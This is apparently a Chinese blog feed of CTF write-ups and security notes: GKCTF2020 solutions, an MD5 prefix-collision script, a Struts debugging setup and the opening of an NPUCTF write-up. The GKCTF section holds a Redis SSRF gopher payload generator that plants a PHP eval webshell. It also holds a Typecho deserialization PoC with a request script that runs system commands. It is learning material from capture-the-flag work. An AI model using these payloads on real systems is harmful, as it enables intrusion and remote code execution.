<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105018707.png" alt="image-20200525105018707"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105045473.png" alt="image-20200525105045473"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105141216.png" alt="image-20200525105141216"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105212253.png" alt="image-20200525105212253"></p>
<p>这题确实签到(放了提示)，感觉主要考对最新一些的CVE的了解。偏实战，爱了爱了。</p>
<h3 id="4-EZ三剑客-EzWeb"><a href="#4-EZ三剑客-EzWeb" class="headerlink" title="4.EZ三剑客-EzWeb"></a>4.EZ三剑客-EzWeb</h3><p>这题SSRF+redis未授权，但是shell死活收不到。后面看WP发现是独立于单容器的内网，内网靶机收不到反弹shell。所以是直接写webshell。</p>
<p>开局就叫你输入URL，八成是个SSRF，就随意输入了127.0.0.1，发现被禁了。然后就想着怎么绕(后面发现不用。。。)</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110646995.png" alt="image-20200525110646995"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110728289.png" alt="image-20200525110728289"></p>
<p>发现<code>0x7f000001</code> 可以绕过。后面用Burp抓包，想扫描下本机端口，看到才看到secret这个参数</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111239096.png" alt="image-20200525111239096"></p>
<p>得到了本机的内网IP</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111352798.png" alt="image-20200525111352798"></p>
<p>这样一看肯定就不是本机的端口渗透，应该在内网的其他机器上，然后内网探测，很明显的提示了</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112129001.png" alt="image-20200525112129001"></p>
<p>然后就随意测了下6379端口，发现有戏</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112303602.png" alt="image-20200525112303602"></p>
<p>直接用脚本生成payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3<span class="number">.8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.31.59.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET['a']);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130359211.png" alt="image-20200525130359211"></p>
<p>接着测试webshell</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130438217.png" alt="image-20200525130438217"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525131721234.png" alt="image-20200525131721234"></p>
<h3 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h3><p>拿到题目源码后发现是0.9版本，先去github下了个0.9版本，然后用对比工具比较install.php</p>
<p>发现<code>session_start();</code>被注释</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525135740889.png" alt="image-20200525135740889"></p>
<p>关键代码</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140208760.png" alt="image-20200525140208760"></p>
<p>首先要反序列化就要SESSION，但<code>session_start();</code>被注释，可以通过以下方法绕过</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140624669.png" alt="image-20200525140624669"></p>
<p><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">Typecho反序列化的文章</a></p>
<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123456789"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure>

<h3 id="6-EZ三剑客-EzNode"><a href="#6-EZ三剑客-EzNode" class="headerlink" title="6.EZ三剑客-EzNode"></a>6.EZ三剑客-EzNode</h3><p>首先看源码，发现delay被设置的很大，执行命令会超时，在node.js<a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">文档中</a>指出 <code>当</code>delay<code>大于</code>2147483647<code>或小于</code>1<code>时，则</code>delay<code>将会被设置为</code>1<code>。 非整数的 delay 会被截断为整数</code></p>
<p>然后题目很奇怪给了包的版本信息，感觉应该是 有公开漏洞</p>
<p>在<a href="https://github.com/advisories" target="_blank" rel="noopener">github advisories</a>找到了漏洞信息</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525151514661.png" alt="image-20200525151514661"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pokemon"><a href="#1-Pokemon" class="headerlink" title="1. Pokémon"></a>1. Pokémon</h3><p>GBA游戏，直接去103号道路，道路上就是flag</p>
<h3 id="2-Harley-Quinn"><a href="#2-Harley-Quinn" class="headerlink" title="2.Harley Quinn"></a>2.Harley Quinn</h3><p>题目信息隐藏的挺细致的，导致一直懵逼。</p>
<p>先是压缩包的属性里有解密的信息</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105114519.png" alt="image-20200526105114519"></p>
<p>然后根据题目描述下载Free_File_Camouflage V1.25</p>
<p>解压后，有个wav音频文件，属性里也有信息</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105632498.png" alt="image-20200526105632498"></p>
<p>提示密码有21位</p>
<p>音频用Sonic Visualiser打开后发现末尾有播音号 可以自己手动解，或者用</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105730727.png" alt="image-20200526105730727"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526113701783.png" alt="image-20200526113701783"></p>
<p>接着用九宫格密码解</p>
<p>222按3下2键就是c，后面同理</p>
<p><img src="/2020/05/GKCTF2020-Writeup/clip_image001.png" alt="img"></p>
<p>最后解出 <code>ctfisfun</code></p>
<p>然后用然后用软件</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526155704949.png" alt="image-20200526155704949"></p>
<h3 id="3-code-obfuscation"><a href="#3-code-obfuscation" class="headerlink" title="3.code obfuscation"></a>3.code obfuscation</h3><p>附件是个扭曲的二维码</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161615952.png" alt="image-20200526161615952"></p>
<p>然后binwalke可以分解出个要密码压缩包</p>
<p>接着修图，ps打开图片,选定好需要变换的区域，右键自由变换后再扭曲，然后截取下来</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161626648.png" alt="image-20200526161626648"></p>
<p>接着matlab处理</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161717329.png" alt="image-20200526161717329"></p>
<p>扫出来 <code>base(gkctf)</code></p>
<p>试了下解不了，可能要baseXX编码。然后用base58解出来了</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526163147548.png" alt="image-20200526163147548"></p>
<p>解压后得到两个文件一个是js代码，一个是密文</p>
<p>js代码经过 混淆，利用<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">在线工具</a>解密后得到解密后的js代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span></span><br><span class="line">        ';Bn='#</span><br><span class="line">        <span class="string">';Bs='</span> (<span class="string">';Bt='</span>)</span><br><span class="line">        <span class="string">';By='</span>.</span><br><span class="line">        <span class="string">';Cb='</span>;</span><br><span class="line">        <span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span></span><br><span class="line">        _ <span class="string">';Cn='</span> &#123;</span><br><span class="line">            <span class="string">';Cp='</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">';Da='</span></span><br><span class="line">        <span class="number">0</span> <span class="string">';Db='</span></span><br><span class="line">        <span class="number">1</span> <span class="string">';Dc='</span></span><br><span class="line">        <span class="number">2</span> <span class="string">';Dd='</span></span><br><span class="line">        <span class="number">3</span> <span class="string">';De='</span></span><br><span class="line">        <span class="number">4</span> <span class="string">';Df='</span></span><br><span class="line">        <span class="number">5</span> <span class="string">';Dg='</span></span><br><span class="line">        <span class="number">6</span> <span class="string">';Dh='</span></span><br><span class="line">        <span class="number">7</span> <span class="string">';Di='</span></span><br><span class="line">        <span class="number">8</span> <span class="string">';Dj='</span></span><br><span class="line">        <span class="number">9</span> <span class="string">';")</span></span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">"Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></span><br><span class="line"></span><br><span class="line">c = &#123;<span class="string">"Bk"</span>: <span class="string">' '</span>, <span class="string">"Bm"</span>: <span class="string">'"'</span>, <span class="string">"Bn"</span>: <span class="string">'#'</span>, <span class="string">"Bs"</span>: <span class="string">'('</span>, <span class="string">"Bt"</span>: <span class="string">')'</span>, <span class="string">"By"</span>: <span class="string">'.'</span>, <span class="string">"Cb"</span>: <span class="string">','</span>, <span class="string">"Cc"</span>: <span class="string">'&lt;'</span>, <span class="string">"Ce"</span>: <span class="string">'&gt;'</span>, <span class="string">"Cl"</span>: <span class="string">'_'</span>,</span><br><span class="line">     <span class="string">"Cn"</span>: <span class="string">'&#123;'</span>, <span class="string">"Cp"</span>: <span class="string">'&#125;'</span>, <span class="string">"Da"</span>: <span class="string">'0'</span>, <span class="string">"Db"</span>: <span class="string">'1'</span>, <span class="string">"Dc"</span>: <span class="string">'2'</span>, <span class="string">"Dd"</span>: <span class="string">'3'</span>, <span class="string">"De"</span>: <span class="string">'4'</span>, <span class="string">"Df"</span>: <span class="string">'5'</span>, <span class="string">"Dg"</span>: <span class="string">'6'</span>, <span class="string">"Dh"</span>: <span class="string">'7'</span>,</span><br><span class="line">     <span class="string">"Di"</span>: <span class="string">'8'</span>, <span class="string">"Dj"</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">f = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b.split(<span class="string">'$'</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> c.keys():</span><br><span class="line">        f = f + c[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = f + i[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>

<h3 id="4-Sail-a-boat-down-the-river"><a href="#4-Sail-a-boat-down-the-river" class="headerlink" title="4.Sail a boat down the river"></a>4.Sail a boat down the river</h3><p>直接用命令分解视频</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165220148.png" alt="image-20200526165220148"></p>
<p>然后从118帧开始观察亮点，短是1帧，长是3帧</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165724934.png" alt="image-20200526165724934"></p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">-</span><span class="string">.</span>--<span class="comment">/</span><span class="string">.</span>--<span class="comment">/</span>--<span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="comment">/</span>--<span class="string">.</span><span class="comment">/</span></span><br></pre></td></tr></table></figure>

<p>摩斯解码</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170554507.png" alt="image-20200526170554507"></p>
<p>第465帧有个二维码，扫码是个百度盘链接</p>
<p>打开，提取码YW8G</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170728445.png" alt="image-20200526170728445"></p>
<p>然后玩数独，根据提示得到密钥</p>
<p><code>52693795149137</code></p>
<p>加密是AES(hex)，坑点是字符集 <code>gb18030/ISO10126</code></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526172054944.png" alt="image-20200526172054944"></p>
<p>解开压缩包，得到 <code>逆光vocal.ovex</code>用打谱软件打开就有flag。真心想不到</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5Crack</title>
    <url>/2019/11/Md5Crack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简单碰撞脚本"><a href="#简单碰撞脚本" class="headerlink" title="简单碰撞脚本"></a>简单碰撞脚本</h2><p>一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>二:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用方法：python md5Crack.py "你要碰撞的字符串" 字符串的起始位置</span></span><br><span class="line"><span class="string">例如：python md5Crack.py “0e" 0</span></span><br><span class="line"><span class="string">将产生MD5值为0e开头的字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #碰撞单MD5</span></span><br><span class="line"><span class="string">            print rnds</span></span><br><span class="line"><span class="string">            stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #碰撞双md5</span></span><br><span class="line"><span class="string">            md52 = hashlib.md5(value1)</span></span><br><span class="line"><span class="string">            if md52.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">            	print rnds+ "=&gt;" + value1+"=&gt;"+ md52.hexdigest()  + "\n"</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 碰撞三MD5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            value2 = md52.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start + str_len] == substr:</span><br><span class="line">                md53 = hashlib.md5(value2)</span><br><span class="line">                <span class="keyword">if</span> md53.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                    <span class="keyword">print</span> rnds + <span class="string">"=&gt;"</span> + value1 + <span class="string">"=&gt;"</span> +value2+<span class="string">"=&gt;"</span>+ md53.hexdigest() + <span class="string">"\n"</span></span><br><span class="line">                    stop_event.set()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = int(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MD5</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA远程调试JAR</title>
    <url>/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEA远程调试JAR"><a href="#IDEA远程调试JAR" class="headerlink" title="IDEA远程调试JAR"></a>IDEA远程调试JAR</h1><p>最近把struts的相关洞跟了一遍，这里记录一下IDEA的调试环境的配置。</p><h2 id="IDEA安装反编译插件"><a href="#IDEA安装反编译插件" class="headerlink" title="IDEA安装反编译插件"></a>IDEA安装反编译插件</h2><p>对于jar包中的class文件，我们需要反编译才能看到源码调试。</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210908172825269.png" alt="image-20210908172825269"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>以调试S2-001为例</p><p>环境使用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h3 id="tomcat开启debug模式"><a href="#tomcat开启debug模式" class="headerlink" title="tomcat开启debug模式"></a>tomcat开启debug模式</h3><a id="more"></a>




<p>修改catalina.sh文件，添加以下内容，调试端口是8081</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">JAVA_OPTS</span>=<span class="string">"-agentlib:jdwp=transport=dt_socket,address=8081,server=y,suspend=n"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/IDEA远程调试JAR/image-20210909091427403.png" alt="image-20210909091427403"></p>
<h3 id="修改docker-compose-yml"><a href="#修改docker-compose-yml" class="headerlink" title="修改docker-compose.yml"></a>修改docker-compose.yml</h3><p>因为除了正常的web端口，还有一个debug端口需要映射</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909091614647.png" alt="image-20210909091614647"></p>
<h3 id="修改Dockerfile"><a href="#修改Dockerfile" class="headerlink" title="修改Dockerfile"></a>修改Dockerfile</h3><p>需要把修改后的<code>catalina.sh</code>替换原来的</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909091713142.png" alt="image-20210909091713142"></p>
<h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><p>如果之前起过容器需要重新build，更新image文件</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909092020998.png" alt="image-20210909092020998"></p>
<h3 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h3><p>把项目中的 S2-001.war下载到本地，解压后使用IDEA作为项目打开。</p>
<p>右键lib-&gt;添加为库</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909092541288.png" alt="image-20210909092541288"></p>
<p>文件- &gt;项目结构 设置项目SDK</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909092729175.png" alt="image-20210909092729175"></p>
<p>右上角添加运行配置</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909092920216.png" alt="image-20210909092920216"></p>
<p>监听debug，下好断点，访问触发</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909093059050.png" alt="image-20210909093059050"></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="无法评估表达式"><a href="#无法评估表达式" class="headerlink" title="无法评估表达式"></a>无法评估表达式</h3><p><img src="/2021/09/IDEA远程调试JAR/Image.png" alt="Image"></p>
<p>和IDEA的自动导入有关</p>
<p>排除相关类的自动导入</p>
<p><img src="/2021/09/IDEA远程调试JAR/image-20210909093454410.png" alt="image-20210909093454410"></p>
<p><img src="/2021/09/IDEA远程调试JAR/Image-1631151331481.png" alt="Image"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF-复现</title>
    <url>/2020/05/NPUCTF2020-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-web🐕"><a href="#1-web🐕" class="headerlink" title="1.web🐕"></a>1.web🐕</h3><p>当时写这道题，知道只知道是CBC字节反转攻击。</p><p>后面看WP才发现考点</p><ol>
<li>cbc padding oracle</li>
<li>cbc 字节翻转</li>
